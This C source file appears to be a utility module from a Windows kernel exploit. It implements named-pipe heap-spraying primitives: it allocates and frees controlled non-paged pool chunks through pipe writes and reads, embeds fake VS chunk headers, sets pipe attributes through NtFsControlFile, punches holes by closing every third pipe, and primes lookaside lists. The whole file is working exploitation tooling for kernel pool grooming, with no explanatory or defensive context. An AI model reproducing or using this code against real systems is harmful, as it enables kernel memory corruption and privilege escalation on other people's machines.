#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "pipe_utils/pipe_utils.h"

#include "windows_api/windows_api.h"

int SetPipeAttribute(pipe_pair_t* target_pipe, char* data, size_t size)
{
    IO_STATUS_BLOCK status;
    char output[0x100];

    memset(output, 0x42, 0xff);

    NtFsControlFile_(target_pipe->write,
        NULL,
        NULL,
        NULL,
        &status,
        0x11003C,
        data,
        size,
        output,
        sizeof(output));
    return 1;
}

int writeDataToPipe(pipe_pair_t* pipe_pair, char* data, size_t bufsize)
{
    DWORD resultLength = 0;

    return WriteFile(
        pipe_pair->write,
        data,
        bufsize,
        &resultLength,
        NULL);
}

int PeekDataFromPipe(pipe_pair_t* pipe_pair, char* out, size_t bufsize)
{
    DWORD resultLength = 0;

    return PeekNamedPipe(
        pipe_pair->read,
        out,
        bufsize,
        &resultLength,
        NULL,
        NULL);
}

int readDataFromPipe(pipe_pair_t* pipe_pair, char* out, size_t bufsize)
{
    DWORD resultLength = 0;

    return ReadFile(
        pipe_pair->read,
        out,
        bufsize,
        &resultLength,
        NULL);
}

int AllocNPPNxChunk(pipe_pair_t* pipe, vs_chunk_t* chunk, size_t bufsize)
{
    char* temp_buffer = (char*)malloc(bufsize + 1);
    memset(temp_buffer, 0x41, bufsize);
    if (chunk) {
        if (bufsize < sizeof(vs_chunk_t)) {
            memcpy(temp_buffer, (char*)chunk, bufsize);
        }
        else {
            memcpy(temp_buffer, (char*)chunk, sizeof(vs_chunk_t));
        }

    }
    return writeDataToPipe(pipe, temp_buffer, bufsize);
}

int FreeNPPNxChunk(pipe_pair_t* pipe, size_t bufsize)
{
    char dummy_out_buf[0x1000];
    return readDataFromPipe(pipe, dummy_out_buf, bufsize);
}

int CreatePipePair(size_t bufsize, pipe_pair_t* pipe_pair)
{
    BOOL res = FALSE;

    // Write the data in user space buffer

    // Creating the pipe to kernel space
    res = CreatePipe(
        &pipe_pair->read,
        &pipe_pair->write,
        NULL,
        bufsize);

    if (res == FALSE)
    {
        fprintf(stderr, "[-] Failed to create pipe pair\n");
        return 0;
    }
    return 1;
}

pipe_spray_t* CreatePipeSpray(size_t nb, size_t size, char* data)
{
    pipe_spray_t* pipe_spray = (pipe_spray_t*)malloc(sizeof(pipe_spray_t) + (nb * sizeof(pipe_pair_t)));
    char* data_buf = (char*)malloc(size + 1);
    size_t pipe_size;

    memcpy(data_buf, data, size);
    data_buf[size] = 0;

    pipe_spray->data_buf = data_buf;
    pipe_spray->nb = nb;

    pipe_spray->bufsize = size - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(pipe_queue_entry_t);
    pipe_size = pipe_spray->bufsize;

    if (!pipe_spray)
    {
        fprintf(stderr, "[-] Failed to allocate memory for pipe spray\n");
        exit(0);
    }
    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        if (!CreatePipePair(pipe_size, &pipe_spray->pipes[i]))
        {
            fprintf(stderr, "[-] Failed to alloc one pipe\n");
            exit(0);
        }
    }
    return pipe_spray;
}

int PerformPipeSpray(pipe_spray_t* pipe_spray)
{
    for (size_t i = 0; i < pipe_spray->nb; i++)
    {

        if (!writeDataToPipe(&pipe_spray->pipes[i], pipe_spray->data_buf, pipe_spray->bufsize))
        {
            fprintf(stderr, "[-] Failed to write in pipe at index %d\n", i);
            return 0;
        }
    }
    return 1;
}

int ClosePipePairHandles(pipe_pair_t* pipe_pair)
{
    if (pipe_pair->write && !CloseHandle(pipe_pair->write))
    {
        fprintf(stderr, "[-] Failed to close write pipe\n");
        return 0;
    }
    pipe_pair->write = NULL;

    if (pipe_pair->read && !CloseHandle(pipe_pair->read))
    {
        fprintf(stderr, "[-] Failed to close read pipe\n");
        return 0;
    }
    pipe_pair->read = NULL;

    return 1;
}

void CleanupPipeSpray(pipe_spray_t* pipe_spray)
{
    for (size_t i = 0; i < pipe_spray->nb; i++)
    {
        ClosePipePairHandles(&pipe_spray->pipes[i]);
    }
    free(pipe_spray->data_buf);
    free(pipe_spray);
}

void FreeEveryThirdPipe(pipe_spray_t* pipe_spray, int start)
{
    for (size_t i = start; i < pipe_spray->nb; i += 3)
    {
        ClosePipePairHandles(&pipe_spray->pipes[i]);
    }
}

void EnableLookaside(int count, ...)
{
    va_list ap;

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        lookaside_t* lookaside = va_arg(ap, lookaside_t*);
        printf("[+] Enabling lookaside for size 0x%x\n", lookaside->size);
        PerformPipeSpray(lookaside->first);
    }
    va_end(ap);

    Sleep(2000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        lookaside_t* lookaside = va_arg(ap, lookaside_t*);
        PerformPipeSpray(lookaside->second);
    }
    va_end(ap);

    Sleep(1000);

    va_start(ap, count);
    for (int i = 0; i < count; i++)
    {
        lookaside_t* lookaside = va_arg(ap, lookaside_t*);
        PerformPipeSpray(lookaside->drain);
    }
    va_end(ap);
}
